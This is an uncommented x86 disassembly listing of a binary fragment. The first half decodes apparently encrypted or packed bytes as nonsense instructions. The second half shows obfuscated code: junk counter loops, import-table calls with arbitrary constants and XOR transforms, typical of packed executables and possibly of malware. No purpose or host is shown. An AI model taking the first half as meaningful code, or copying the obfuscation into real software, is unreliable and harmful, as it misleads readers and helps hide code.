  418a37:	call   0xfe6a:0x53e14c4b
  418a3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418a3f:	loop   0x418a89
  418a41:	pop    esp
  418a42:	and    eax,0x83eeefdc
  418a47:	fidiv  WORD PTR [eax]
  418a49:	outs   dx,BYTE PTR ds:[esi]
  418a4a:	mov    ecx,0x64c14465
  418a4f:	sub    BYTE PTR [ecx-0x5c0fb93b],dl
  418a55:	enter  0xb473,0xbe
  418a59:	mov    edi,gs
  418a5b:	loop   0x418a1c
  418a5d:	arpl   ax,cx
  418a5f:	push   esi
  418a60:	sbb    BYTE PTR [esi],bl
  418a62:	pop    es
  418a63:	mov    cl,0xe6
  418a65:	aaa    
  418a66:	jne    0x418aaf
  418a68:	xchg   esp,eax
  418a69:	sub    eax,0x3b4678fc
  418a6e:	push   edx
  418a6f:	retf   
  418a70:	retf   0x587f
  418a73:	fst    QWORD PTR [esi-0x79]
  418a76:	push   edx
  418a77:	imul   esp
  418a79:	fisubr WORD PTR [ebp-0x7a]
  418a7c:	pop    edx
  418a7d:	jmp    0x418a43
  418a7f:	scas   eax,DWORD PTR es:[edi]
  418a80:	mov    eax,0xe94f89bb
  418a85:	out    0x46,al
  418a87:	in     al,0x7f
  418a89:	and    BYTE PTR [ecx+0x140e00fe],0x3f
  418a90:	add    ecx,0xffffff9b
  418a93:	test   al,0xfc
  418a95:	int    0x2f
  418a97:	scas   al,BYTE PTR es:[edi]
  418a98:	stos   BYTE PTR es:[edi],al
  418a99:	pop    edi
  418a9a:	loope  0x418a27
  418a9c:	adc    ecx,DWORD PTR [esi+ecx*4+0x15327d00]
  418aa3:	and    ch,BYTE PTR [esi-0x51]
  418aa6:	outs   dx,BYTE PTR ds:[esi]
  418aa7:	data16 sar BYTE PTR [ebx-0x345e669a],0x52
  418aaf:	mov    ebp,0x418bc0e6
  418ab4:	and    eax,0x5ccbed4c
  418ab9:	xor    eax,0x8c417fc2
  418abe:	jne    0x418a6a
  418ac0:	push   edx
  418ac1:	in     al,0xa6
  418ac3:	cmp    DWORD PTR [edx],esp
  418ac5:	cmp    eax,0x24a76368
  418aca:	and    eax,0xd4e753d3
  418acf:	fsubp  st(2),st
  418ad1:	or     eax,0x89df066
  418ad6:	adc    edx,DWORD PTR [esi-0x65]
  418ad9:	dec    edx
  418ada:	inc    ecx
  418adc:	ins    DWORD PTR es:[edi],dx
  418add:	sbb    DWORD PTR ds:0x7b8d9a2c,edx
  418ae3:	mov    ah,0xf4
  418ae5:	int3   
  418ae6:	xchg   ecx,eax
  418ae7:	test   DWORD PTR [edi],ebp
  418ae9:	dec    edi
  418aea:	xchg   esp,eax
  418aeb:	cld    
  418aec:	fcmovnb st,st(2)
  418aee:	fisttp WORD PTR [edx+eiz*2+0x6708b314]
  418af5:	mov    bh,0x34
  418af7:	mov    bh,0x43
  418af9:	fisttp DWORD PTR [edx]
  418afb:	jne    0x418ad9
  418afd:	call   0x3b01:0x3771623f
  418b04:	xor    DWORD PTR ds:0xc6f8072,edx
  418b0a:	scas   al,BYTE PTR es:[edi]
  418b0b:	mov    ah,0xc4
  418b0d:	pop    esp
  418b0e:	xchg   edx,eax
  418b0f:	sub    BYTE PTR [ecx-0x6879c92f],dh
  418b15:	retf   0xab39
  418b18:	les    ecx,FWORD PTR ds:0xf3658d0b
  418b1e:	push   es
  418b1f:	popf   
  418b20:	stc    
  418b21:	inc    edi
  418b22:	sub    al,0x95
  418b24:	mov    al,BYTE PTR [ecx+ebx*2-0x75]
  418b28:	cs push 0xedeb6d28
  418b2e:	ins    BYTE PTR es:[edi],dx
  418b2f:	pop    ss
  418b30:	test   DWORD PTR [edi],ebx
  418b32:	dec    ecx
  418b33:	pop    ds
  418b34:	sbb    ch,BYTE PTR [ecx-0x1398656e]
  418b3a:	push   ebx
  418b3b:	gs fmul st(1),st
  418b3e:	test   BYTE PTR [edx+0x396905a9],al
  418b44:	fldcw  WORD PTR [edx+0x2d]
  418b47:	popf   
  418b48:	ins    BYTE PTR es:[edi],dx
  418b49:	cmp    ebx,ebx
  418b4b:	and    edx,esi
  418b4d:	hlt    
  418b4e:	push   ebp
  418b4f:	pop    es
  418b50:	fadd   QWORD PTR [edx-0x730dce79]
  418b56:	dec    edi
  418b57:	call   0x392d:0x8a176159
  418b5e:	mov    cl,0xbe
  418b60:	dec    esp
  418b61:	pusha  
  418b62:	(bad)  
  418b63:	ja     0x418b1e
  418b65:	sbb    eax,0x9279a1f4
  418b6a:	push   esp
  418b6b:	and    bl,BYTE PTR [edx+0x657c22de]
  418b71:	pop    ebp
  418b72:	xor    esi,DWORD PTR [ebx+0x6ee203fc]
  418b78:	jb     0x418bde
  418b7a:	rcr    DWORD PTR [ebp-0x80],0xfa
  418b7e:	add    edi,DWORD PTR [ecx+0x54f4ccb8]
  418b84:	aam    0x6d
  418b86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b87:	push   ebp
  418b88:	pop    esi
  418b89:	xchg   esi,eax
  418b8a:	mov    gs,WORD PTR [edx+0x4b6aea15]
  418b90:	sbb    edx,DWORD PTR [ecx-0x2e]
  418b93:	xchg   edi,eax
  418b94:	and    al,BYTE PTR [esi]
  418b96:	fcom   DWORD PTR [eax+0x72214091]
  418b9c:	jp     0x418b9c
  418b9e:	int    0x94
  418ba0:	dec    esp
  418ba1:	xchg   al,al
  418ba3:	xor    DWORD PTR [edi+0x2efbfdde],ebp
  418ba9:	outs   dx,DWORD PTR ds:[esi]
  418baa:	dec    eax
  418bab:	jl     0x418b3e
  418bad:	or     eax,0xc4b97e2a
  418bb2:	xchg   edi,eax
  418bb3:	fdivr  DWORD PTR [ebx]
  418bb5:	mov    cl,0xbe
  418bb7:	push   ds
  418bb8:	xor    eax,0x808c45d7
  418bbd:	sub    BYTE PTR [bx+di-0x7231],cl
  418bc2:	jnp    0x418b70
  418bc4:	test   al,0x38
  418bc6:	sub    eax,0xda037c5e
  418bcb:	fldcw  WORD PTR [ecx+eax*2-0x14]
  418bcf:	mov    al,ds:0xaff43185
  418bd4:	sub    eax,0xffe1032c
  418bd9:	call   0xc28968e4
  418bde:	pop    es
  418bdf:	dec    esi
  418be0:	sub    edx,DWORD PTR [ecx+0x57]
  418be3:	sub    DWORD PTR gs:[edi+0x360053c9],ecx
  418bea:	and    BYTE PTR [ecx-0x1d],dl
  418bed:	retf   0xf824
  418bf0:	dec    esp
  418bf1:	mov    BYTE PTR [ebx+0x7a8d6be6],0x6c
  418bf8:	adc    al,0x88
  418bfa:	cmp    eax,0x9d89191e
  418bff:	adc    eax,0x20d71fb4
  418c04:	imul   edi,DWORD PTR [ecx],0xae2dcd2c
  418c0a:	adc    edi,DWORD PTR [edi-0x1cbd4c03]
  418c10:	xlat   BYTE PTR ds:[ebx]
  418c11:	ins    DWORD PTR es:[edi],dx
  418c12:	push   ecx
  418c13:	retf   
  418c14:	aad    0x46
  418c16:	fcomp  QWORD PTR [ecx-0x193707f2]
  418c1c:	shl    ebp,cl
  418c1e:	(bad)  
  418c1f:	push   eax
  418c20:	out    0xdd,eax
  418c22:	dec    esp
  418c23:	leave  
  418c24:	nop
  418c25:	mov    ch,0xeb
  418c27:	loopne 0x418c21
  418c29:	xchg   ebp,eax
  418c2a:	ret    
  418c2b:	cmp    DWORD PTR [ebx-0x7c8c4eb4],edx
  418c31:	sbb    dl,BYTE PTR [esi+0x6f]
  418c34:	in     eax,0x64
  418c36:	adc    ebp,ebx
  418c38:	fsubr  QWORD PTR [esi+0x4e]
  418c3b:	xchg   DWORD PTR [esi+eax*4+0x4],ebx
  418c3f:	pop    ebp
  418c40:	sbb    BYTE PTR [edi],ah
  418c42:	(bad)  
  418c43:	mov    ds:0xd1e0ee49,al
  418c48:	xor    al,0x67
  418c4a:	les    eax,FWORD PTR [ecx+0x2f5bec6e]
  418c50:	jns    0x418c75
  418c52:	xchg   ecx,eax
  418c53:	mov    edx,0x1a971695
  418c58:	das    
  418c59:	inc    ebp
  418c5a:	pusha  
  418c5b:	fistp  DWORD PTR [ebp+esi*1-0xa]
  418c5f:	stos   BYTE PTR es:[edi],al
  418c60:	jl     0x418cc6
  418c62:	aam    0x25
  418c64:	(bad)  
  418c65:	out    dx,al
  418c66:	sbb    eax,0x959fb451
  418c6b:	cs inc edi
  418c6d:	mov    dh,dh
  418c6f:	xchg   ebx,eax
  418c70:	and    al,0xdc
  418c72:	sub    DWORD PTR [edi+0x3a4bd13d],ebx
  418c78:	stos   DWORD PTR es:[edi],eax
  418c79:	dec    eax
  418c7a:	or     DWORD PTR [esp+ecx*1+0xb],edx
  418c7e:	cli    
  418c7f:	mov    gs,WORD PTR [ebx-0x3e]
  418c82:	inc    eax
  418c83:	adc    BYTE PTR [ecx],bl
  418c85:	and    eax,DWORD PTR [edx+0x1]
  418c88:	dec    ebx
  418c89:	clc    
  418c8a:	jno    0x418ccb
  418c8c:	test   esp,edi
  418c8e:	mov    bh,0x35
  418c90:	sub    BYTE PTR [ebx-0x3b0bbc36],ch
  418c96:	ss jmp 0xa35769a3
  418c9c:	out    0x7f,al
  418c9e:	fs shl edi,cl
  418ca1:	add    BYTE PTR [edi-0x704d2ea1],dl
  418ca7:	imul   DWORD PTR [ecx+eiz*1-0x65]
  418cab:	ja     0x418cfb
  418cad:	sub    bl,al
  418caf:	mov    al,ds:0x3a6464a0
  418cb4:	mov    ah,0xc1
  418cb6:	mov    esp,DWORD PTR [edx]
  418cb8:	mov    esp,0x96c005cb
  418cbd:	cmp    eax,DWORD PTR [edx]
  418cbf:	aas    
  418cc0:	inc    esi
  418cc1:	cmp    eax,0x43d7cacc
  418cc6:	add    al,BYTE PTR [esi-0x74]
  418cc9:	sbb    eax,0xdeaee77d
  418cce:	cs jbe 0x418c52
  418cd1:	and    al,0xa
  418cd3:	pusha  
  418cd4:	hlt    
  418cd5:	mov    bh,BYTE PTR [eax-0xee5160c]
  418cdb:	jae    0x418d12
  418cdd:	or     eax,0xfb0c1725
  418ce2:	sbb    esp,DWORD PTR [ecx-0x3b6b0f46]
  418ce8:	pushf  
  418ce9:	xor    DWORD PTR [eax],0x93bcfddf
  418cef:	jp     0x418d23
  418cf1:	les    ebp,FWORD PTR [edi-0x4677ef37]
  418cf7:	mov    ss,WORD PTR [esp+ebp*1]
  418cfa:	mov    al,ds:0x87a47e27
  418cff:	add    ch,cl
  418d01:	mov    DWORD PTR [eax+edi*1-0x3faeb25],ecx
  418d08:	lock stc 
  418d0a:	push   ss
  418d0b:	retf   
  418d0c:	aaa    
  418d0d:	jo     0x418c9f
  418d0f:	jmp    0x19f97a97
  418d14:	dec    ah
  418d16:	push   0x48bab00c
  418d1b:	cdq    
  418d1c:	jmp    0x418d87
  418d1e:	clc    
  418d1f:	loopne 0x418d0b
  418d21:	clc    
  418d22:	retf   0x71f6
  418d25:	lods   al,BYTE PTR ds:[esi]
  418d26:	lea    ebp,[esi-0x3f]
  418d29:	cmp    al,BYTE PTR [esi+esi*4-0x4d]
  418d2d:	repz jmp 0x44c7:0x2b95563d
  418d35:	cmp    eax,0xfde6e26e
  418d3a:	xor    BYTE PTR ds:0xd39b54cd,dl
  418d40:	xor    esi,edi
  418d42:	out    0x73,al
  418d44:	cli    
  418d45:	add    al,BYTE PTR [eax-0x5a377ab7]
  418d4b:	jmp    0x418d39
  418d4d:	pop    ecx
  418d4e:	int3   
  418d4f:	cwde   
  418d50:	adc    DWORD PTR [ebx+0x15],0x188c3a1
  418d57:	pop    esp
  418d58:	mov    edi,ebx
  418d5a:	in     al,0x7e
  418d5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d5d:	jnp    0x418d5d
  418d5f:	dec    esp
  418d60:	(bad)  
  418d61:	dec    ecx
  418d62:	shl    BYTE PTR [ecx],1
  418d64:	stc    
  418d65:	retf   
  418d66:	scas   eax,DWORD PTR es:[edi]
  418d67:	push   cs
  418d68:	mov    dl,0x95
  418d6a:	xchg   ebp,eax
  418d6b:	cmp    esi,edx
  418d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d6e:	jae    0x418d4f
  418d70:	test   eax,0xc8c884cc
  418d75:	mov    dh,0x59
  418d77:	or     DWORD PTR [esi+eiz*1],edx
  418d7a:	(bad)  
  418d7b:	xchg   esp,eax
  418d7c:	push   esp
  418d7d:	adc    bh,al
  418d7f:	stc    
  418d80:	and    BYTE PTR [ebp+0x170090b9],dl
  418d86:	loopne 0x418d1b
  418d88:	push   esi
  418d89:	add    al,0xa9
  418d8c:	push   ds
  418d8d:	(bad)  
  418d8e:	lahf   
  418d8f:	jb     0x418d92
  418d91:	xchg   esi,eax
  418d92:	jmp    0x1e4a:0xd59e9a76
  418d99:	jb     0x418d40
  418d9b:	push   esp
  418d9c:	test   DWORD PTR [esi],ebx
  418d9e:	(bad)  
  418d9f:	fstp   DWORD PTR [eax]
  418da1:	xchg   esi,eax
  418da2:	sub    edx,0x4a
  418da5:	push   ebx
  418da6:	or     DWORD PTR [eax+0x5d],edi
  418da9:	xor    al,0xd7
  418dab:	pop    ds
  418dac:	(bad)  
  418dad:	cwde   
  418dae:	jae    0x418e11
  418db0:	punpckldq mm2,mm6
  418db3:	fldln2 
  418db5:	xchg   ebx,eax
  418db6:	test   bh,bh
  418db8:	cmp    ah,BYTE PTR [ecx]
  418dba:	in     al,dx
  418dbb:	add    eax,0x41866f29
  418dc0:	push   edi
  418dc1:	mov    eax,ds:0x94ab0880
  418dc6:	aaa    
  418dc7:	(bad)
  418dcb:	inc    ebp
  418dcc:	xchg   ebx,eax
  418dcd:	xchg   DWORD PTR [esi],ebx
  418dcf:	lock mov eax,ds:0x663415b5
  418dd5:	sbb    DWORD PTR [edx+0x13],0xffffffaf
  418dd9:	(bad)  
  418dda:	gs arpl ax,si
  418ddd:	int3   
  418dde:	mov    eax,0x75848886
  418de3:	jns    0x418e05
  418de5:	xchg   DWORD PTR [ebx-0x4e94cda4],eax
  418deb:	gs xchg esi,eax
  418ded:	popf   
  418dee:	ja     0x418d8b
  418df0:	push   esp
  418df1:	add    DWORD PTR [ebx],ecx
  418df3:	add    eax,0xd7ae86ae
  418df8:	add    edx,esp
  418dfa:	imul   edx,edx,0xffffffec
  418dfd:	sub    ebx,edx
  418dff:	and    bh,BYTE PTR [esp+eax*1-0x55dc5139]
  418e06:	mov    dl,0xb0
  418e08:	sub    BYTE PTR [edi],dh
  418e0a:	pop    esp
  418e0b:	ror    BYTE PTR [ebp-0x516900f7],0xb1
  418e12:	ds repnz int3 
  418e15:	dec    esi
  418e16:	inc    esp
  418e17:	loop   0x418dfb
  418e19:	dec    esi
  418e1a:	pop    edi
  418e1b:	jge    0x418e2f
  418e1d:	add    cl,BYTE PTR [ecx-0x5]
  418e20:	xor    eax,0xbb92a84a
  418e25:	push   0x80870f9f
  418e2a:	je     0x418db6
  418e2c:	ror    edx,0xbe
  418e2f:	fwait
  418e30:	inc    esp
  418e31:	inc    esi
  418e32:	mov    WORD PTR [esi-0x46],fs
  418e35:	xchg   ebp,eax
  418e36:	psubsw mm7,QWORD PTR [edi-0x4f4c9fe1]
  418e3d:	pop    ss
  418e3e:	and    DWORD PTR [esi-0x226bc4c2],edi
  418e44:	push   0x65
  418e46:	push   eax
  418e47:	dec    ebp
  418e48:	xor    eax,0xfe4f7184
  418e4d:	leave  
  418e4e:	leave  
  418e4f:	mov    ecx,0x183a5b7c
  418e54:	mov    ebx,0x1c348c3e
  418e59:	(bad)  
  418e5a:	jmp    0x2060:0xa6d4dd8d
  418e61:	cmp    BYTE PTR [eax],cl
  418e63:	mov    al,0x60
  418e65:	or     edx,DWORD PTR [edi+0x31bf5ce2]
  418e6b:	hlt    
  418e6c:	(bad)  
  418e6e:	inc    ecx
  418e6f:	push   eax
  418e70:	pop    esi
  418e71:	sti    
  418e72:	inc    edx
  418e73:	shr    DWORD PTR [edx+0x7204a862],cl
  418e79:	xchg   ebx,eax
  418e7a:	out    0x4e,al
  418e7c:	sub    eax,0xf8f16dec
  418e81:	ins    DWORD PTR es:[edi],dx
  418e82:	lods   eax,DWORD PTR ds:[esi]
  418e83:	out    dx,al
  418e84:	lahf   
  418e85:	out    dx,eax
  418e86:	dec    eax
  418e87:	enter  0xe5e2,0x5a
  418e8b:	outs   dx,BYTE PTR ds:[esi]
  418e8c:	sub    DWORD PTR [esi-0x21a30897],esp
  418e92:	add    eax,0xde111687
  418e97:	jmp    0x59b:0x9e08b5f7
  418e9e:	sahf   
  418e9f:	push   edx
  418ea0:	in     al,dx
  418ea1:	shl    ch,0xa6
  418ea4:	mov    cl,0x39
  418ea6:	push   esp
  418ea7:	les    edi,FWORD PTR [edx+0x61]
  418eaa:	sub    DWORD PTR [edi-0x21],0x10888d0f
  418eb1:	push   ds
  418eb2:	pop    ebp
  418eb3:	loop   0x418ecf
  418eb5:	sbb    al,BYTE PTR [ebx+0x4824ab88]
  418ebb:	mov    bl,0x55
  418ebd:	push   edi
  418ebe:	dec    esi
  418ebf:	xchg   edx,eax
  418ec0:	lahf   
  418ec1:	inc    esp
  418ec2:	cmp    bh,BYTE PTR [ecx-0x3acea314]
  418ec8:	test   al,0x7
  418eca:	imul   ebx,DWORD PTR [edi],0xfdaf446f
  418ed0:	lods   eax,DWORD PTR ds:[esi]
  418ed1:	mov    ebx,0xa9606aad
  418ed6:	xlat   BYTE PTR ds:[ebx]
  418ed7:	hlt    
  418ed8:	out    0x9a,eax
  418eda:	mov    bh,0x4b
  418edc:	stos   DWORD PTR es:[edi],eax
  418edd:	retf   0x1ece
  418ee0:	mov    eax,0xb22e4f1f
  418ee5:	repz fs fcmove st,st(6)
  418ee9:	ret    
  418eea:	inc    eax
  418eeb:	nop
  418eec:	popf   
  418eed:	call   0x18d38cc
  418ef2:	lahf   
  418ef3:	pusha  
  418ef4:	(bad)  
  418ef5:	mov    edx,0xc0e05201
  418efa:	pop    eax
  418efb:	lods   al,BYTE PTR ds:[esi]
  418efc:	lods   eax,DWORD PTR ds:[esi]
  418efd:	jns    0x418f49
  418eff:	push   esi
  418f00:	pop    esp
  418f01:	test   al,0x88
  418f03:	fs scas eax,DWORD PTR es:[edi]
  418f05:	sbb    ebx,DWORD PTR [ecx]
  418f07:	mov    DWORD PTR [ebp-0x43369c99],0x7c0257e4
  418f11:	bound  edi,QWORD PTR [ecx]
  418f13:	inc    edi
  418f14:	popa   
  418f15:	fsub   st,st(5)
  418f17:	adc    eax,edx
  418f19:	rol    ecx,cl
  418f1b:	adc    eax,0xefd442f2
  418f20:	dec    ecx
  418f21:	jae    0x418ef5
  418f23:	jg     0x418f3b
  418f25:	xchg   esi,eax
  418f26:	sbb    DWORD PTR [edx],0xf
  418f29:	int3   
  418f2a:	pop    edi
  418f2b:	xor    al,0x80
  418f2d:	pop    ebp
  418f2e:	scas   eax,DWORD PTR es:[edi]
  418f2f:	cwde   
  418f30:	stos   DWORD PTR es:[edi],eax
  418f31:	or     cl,dl
  418f33:	adc    eax,0xa43d0c77
  418f38:	sbb    ch,bh
  418f3a:	mov    ah,0x46
  418f3c:	mov    ds:0xf57c053d,eax
  418f41:	cld    
  418f42:	jecxz  0x418f1d
  418f44:	test   BYTE PTR [esi],ah
  418f46:	inc    ebp
  418f47:	xchg   ebx,eax
  418f48:	aam    0x10
  418f4a:	pop    edi
  418f4b:	call   0xaf21:0x4cddb712
  418f52:	xor    edx,ecx
  418f54:	enter  0x4bdb,0x14
  418f58:	jnp    0x418fa1
  418f5a:	fwait
  418f5b:	mov    bl,0xa5
  418f5d:	test   DWORD PTR [ecx+0xb],edi
  418f60:	xor    dl,0x6f
  418f63:	nop
  418f64:	les    ecx,FWORD PTR [edi-0x2d]
  418f67:	mov    ebp,0x2102b56f
  418f6c:	pop    edx
  418f6d:	sar    ah,1
  418f6f:	ins    DWORD PTR es:[edi],dx
  418f70:	dec    edx
  418f71:	mov    edx,0x709f62e7
  418f76:	mov    esi,0x55b5b3aa
  418f7b:	jae    0x418f3b
  418f7d:	ds mov ch,0x1b
  418f80:	mov    al,0x23
  418f82:	popf   
  418f83:	aam    0xee
  418f85:	test   DWORD PTR [esi+0x52f9447d],0xcf52c577
  418f8f:	dec    eax
  418f90:	add    BYTE PTR [esp+ebp*2],bl
  418f93:	sub    dh,BYTE PTR [edx+0x7a]
  418f96:	shl    DWORD PTR [eax],1
  418f98:	sbb    eax,0xee266ed0
  418f9d:	mov    eax,edi
  418f9f:	(bad)  
  418fa0:	repnz scas al,BYTE PTR es:[edi]
  418fa2:	pop    esi
  418fa3:	or     DWORD PTR [ecx-0x7b918d85],edx
  418fa9:	pop    edx
  418faa:	cli    
  418fab:	adc    BYTE PTR [ecx+0x9],0xde
  418faf:	lahf   
  418fb0:	mov    ds:0xad4b82b4,al
  418fb5:	lock add DWORD PTR [ecx+0x3fdba1dc],ebx
  418fbc:	mov    edx,0xd1308678
  418fc1:	xchg   esi,eax
  418fc2:	fist   WORD PTR [edx]
  418fc4:	adc    cl,BYTE PTR [ebp-0x383b88cc]
  418fca:	test   al,0xe9
  418fcc:	xchg   esi,eax
  418fcd:	push   ebx
  418fce:	pop    esi
  418fcf:	(bad)  
  418fd0:	lock in al,dx
  418fd2:	cdq    
  418fd3:	sbb    al,al
  418fd5:	jle    0x41901f
  418fd7:	xchg   esi,eax
  418fd8:	pop    ecx
  418fd9:	mov    fs,WORD PTR [ecx+edx*1]
  418fdc:	les    esp,FWORD PTR [ebp-0x1d070afe]
  418fe2:	xor    esp,ebp
  418fe4:	inc    ecx
  418fe5:	jmp    0x418fde
  418fe7:	add    eax,0xe08cd3df
  418fec:	scas   al,BYTE PTR es:[edi]
  418fed:	cmc    
  418fee:	iret   
  418fef:	adc    DWORD PTR [ecx+0x7b],edi
  418ff2:	cli    
  418ff3:	outs   dx,BYTE PTR ds:[esi]
  418ff4:	adc    eax,edi
  418ff6:	mov    bh,0xd6
  418ff8:	inc    eax
  418ff9:	jle    0x418fac
  418ffb:	sub    dl,BYTE PTR ds:0x6804b4e0
  419001:	push   cs
  419002:	or     BYTE PTR [ecx],0x1b
  419005:	add    eax,0x1a719108
  41900a:	fdiv   DWORD PTR [bx+di-0x71d6]
  41900f:	pop    es
  419010:	xor    ebx,DWORD PTR [ebx]
  419012:	add    edx,eax
  419014:	jae    0x41902a
  419016:	pop    ecx
  419017:	sub    al,dh
  419019:	int3   
  41901a:	add    al,0xba
  41901c:	(bad)  [edx+0x32]
  41901f:	add    BYTE PTR [ecx+0x42a00805],al
  419025:	add    BYTE PTR [eax+0x5e],dl
  419028:	add    BYTE PTR [eax],al
  41902a:	add    edi,edx
  41902c:	mov    DWORD PTR ds:0x42a000,0x7626
  419036:	cmp    DWORD PTR [eax],edi
  419038:	je     0x419045
  41903e:	mov    eax,DWORD PTR [eax]
  419040:	jmp    0x41b79b
  419045:	mov    eax,DWORD PTR [ebp+0x18]
  419048:	mov    DWORD PTR ds:0x42b004,0x29bc
  419052:	cmp    eax,esi
  419054:	jne    0x41906e
  41905a:	push   0xf89c85b5
  41905f:	mov    DWORD PTR ds:0x42a018,0x6618
  419069:	jmp    0x41b78a
  41906e:	mov    esi,DWORD PTR [ebp+0x18]
  419071:	mov    eax,0xf89c85b4
  419076:	mov    DWORD PTR ds:0x42a010,0x8ff
  419080:	cmp    esi,eax
  419082:	mov    DWORD PTR ds:0x42d010,0x7cdb
  41908c:	jne    0x41b77a
  419092:	mov    eax,DWORD PTR [ebp+0x10]
  419095:	xor    esi,esi
  419097:	add    esi,DWORD PTR ds:0x423e7e
  41909d:	mov    esi,DWORD PTR [esi]
  41909f:	and    DWORD PTR ds:0x42a010,esi
  4190a5:	xor    eax,ecx
  4190a7:	mov    DWORD PTR ds:0x42c01c,0x15
  4190b1:	cmp    DWORD PTR ds:0x42c01c,0x0
  4190b8:	je     0x419106
  4190be:	cmp    DWORD PTR ds:0x42c01c,0x7
  4190c5:	jne    0x4190d4
  4190cb:	push   DWORD PTR [ebp-0xc]
  4190ce:	call   DWORD PTR ds:0x425030
  4190d4:	cmp    DWORD PTR ds:0x42c01c,0x8
  4190db:	jne    0x4190ee
  4190e1:	mov    esi,DWORD PTR ds:0x42c01c
  4190e7:	dec    esi
  4190e8:	mov    DWORD PTR ds:0x42c01c,esi
  4190ee:	mov    esi,DWORD PTR ds:0x42c01c
  4190f4:	dec    esi
  4190f5:	mov    DWORD PTR ds:0x42c01c,esi
  4190fb:	jmp    0x4190b1
  419100:	neg    DWORD PTR ds:0x42b00c
  419106:	add    eax,edx
  419108:	and    DWORD PTR ds:0x42b004,0x0
  419112:	mov    esi,DWORD PTR ds:0x42b004
  419118:	inc    esi
  419119:	mov    DWORD PTR ds:0x42b004,esi
  41911f:	cmp    DWORD PTR ds:0x42b004,0x4
  419126:	jne    0x41913c
  41912c:	push   0x6d2e
  419131:	push   0x438c
  419136:	call   DWORD PTR ds:0x425034
  41913c:	cmp    DWORD PTR ds:0x42b004,0x3
  419143:	jne    0x419156
  419149:	mov    esi,DWORD PTR ds:0x42b004
  41914f:	inc    esi
  419150:	mov    DWORD PTR ds:0x42b004,esi
  419156:	cmp    DWORD PTR ds:0x42b004,0x10
  41915d:	jb     0x419112
  419163:	mov    DWORD PTR [ebp-0x18],eax
  419166:	and    DWORD PTR ds:0x42d014,0x0
  419170:	mov    eax,ds:0x42d014
  419175:	inc    eax
  419176:	mov    ds:0x42d014,eax
  41917b:	cmp    DWORD PTR ds:0x42d014,0x1a
  419182:	jne    0x41919d
  419188:	push   0x424592
  41918d:	push   0x424558
  419192:	push   0x87a6
  419197:	call   DWORD PTR ds:0x42503c
  41919d:	cmp    DWORD PTR ds:0x42d014,0x15
  4191a4:	jb     0x419170
  4191aa:	inc    esi
  4191ab:	mov    eax,DWORD PTR [ebp+0xc]
  4191ae:	mov    DWORD PTR ds:0x42c000,0x10
  4191b8:	cmp    DWORD PTR ds:0x42c000,0x0
  4191bf:	je     0x419213
  4191c5:	cmp    DWORD PTR ds:0x42c000,0x5
  4191cc:	jne    0x4191e5
  4191d2:	push   DWORD PTR [ebp-0x14]
  4191d5:	push   0x594c
  4191da:	push   0x7c33
  4191df:	call   DWORD PTR ds:0x425040
  4191e5:	cmp    DWORD PTR ds:0x42c000,0x6
  4191ec:	jne    0x4191ff
  4191f2:	mov    esi,DWORD PTR ds:0x42c000
  4191f8:	dec    esi
  4191f9:	mov    DWORD PTR ds:0x42c000,esi
  4191ff:	xor    esi,esi
  419201:	add    esi,DWORD PTR ds:0x42c000
  419207:	dec    esi
  419208:	mov    DWORD PTR ds:0x42c000,esi
  41920e:	jmp    0x4191b8
  419213:	mov    esi,DWORD PTR [ebp-0x8]
  419216:	and    DWORD PTR ds:0x429020,0x232c
  419220:	xor    eax,ecx
  419222:	inc    DWORD PTR ds:0x429028
  419228:	add    eax,edx
  41922a:	and    DWORD PTR ds:0x42a008,0x32e2
  419234:	imul   eax,DWORD PTR [esi]
  419237:	mov    esi,DWORD PTR [ebp+0x8]
  41923a:	xor    esi,ecx
  41923c:	add    esi,edx
  41923e:	cmp    esi,eax
  419240:	mov    eax,DWORD PTR [ebp-0x4]
  419243:	push   ebx
  419244:	je     0x419263
  41924a:	mov    esi,DWORD PTR [ebp-0x18]
  41924d:	add    DWORD PTR [eax],esi
  41924f:	mov    eax,DWORD PTR [ebp-0x4]
  419252:	mov    esi,DWORD PTR [ebp+0xc]
  419255:	xor    esi,ecx
  419257:	add    esi,edx
  419259:	imul   esi,DWORD PTR [eax]
  41925c:	mov    DWORD PTR [eax],esi
  41925e:	jmp    0x419268
  419263:	mov    esi,DWORD PTR [ebp+0x14]
  419266:	xor    DWORD PTR [eax],esi
  419268:	mov    eax,DWORD PTR [ebp-0x4]
  41926b:	mov    edi,DWORD PTR [ebp+0x10]
  41926e:	xor    edi,ecx
  419270:	mov    esi,0xffcd8d25
  419275:	mov    ebx,esi
  419277:	sub    ebx,edi
  419279:	add    DWORD PTR [eax],ebx
  41927b:	mov    eax,DWORD PTR [ebp-0x4]
  41927e:	mov    edi,DWORD PTR [ebp-0x8]
  419281:	add    edi,DWORD PTR [eax]
  419283:	mov    DWORD PTR [ebp-0x8],edi
  419286:	mov    eax,DWORD PTR [ebp+0xc]
  419289:	mov    edi,DWORD PTR [ebp+0xc]
  41928c:	xor    edi,ecx
  41928e:	xor    eax,ecx
  419290:	lea    eax,[eax+edi*1+0x64e5b6]
  419297:	mov    edi,DWORD PTR [ebp+0xc]
  41929a:	xor    edi,ecx
  41929c:	add    edi,edx
  41929e:	imul   eax,edi
  4192a1:	mov    edi,DWORD PTR [ebp+0xc]
  4192a4:	xor    edi,ecx
  4192a6:	sub    edi,eax
  4192a8:	mov    eax,DWORD PTR [ebp-0x4]
  4192ab:	add    edi,edx
  4192ad:	cmp    DWORD PTR [eax],edi
  4192af:	mov    eax,DWORD PTR [ebp-0x4]
  4192b2:	mov    edi,DWORD PTR [ebp+0x10]
  4192b5:	jg     0x4192c8
  4192bb:	xor    edi,ecx
  4192bd:	mov    ebx,esi
  4192bf:	sub    ebx,edi
  4192c1:	add    DWORD PTR [eax],ebx
  4192c3:	jmp    0x4192ce
  4192c8:	xor    edi,ecx
  4192ca:	add    edi,edx
  4192cc:	add    DWORD PTR [eax],edi
  4192ce:	mov    eax,DWORD PTR [ebp-0x8]
  4192d1:	mov    edi,DWORD PTR [ebp-0x10]
  4192d4:	mov    eax,DWORD PTR [eax]
  4192d6:	xor    edi,ecx
  4192d8:	add    edi,0x3272da
  4192de:	not    edi
  4192e0:	and    eax,edi
  4192e2:	movsx  di,BYTE PTR [eax+0x1]
  4192e7:	mov    ebx,0x3b4b
  4192ec:	sub    di,bx
  4192ef:	mov    ebx,0x8a85
  4192f4:	xor    di,bx
  4192f7:	mov    ebx,0x4f8a
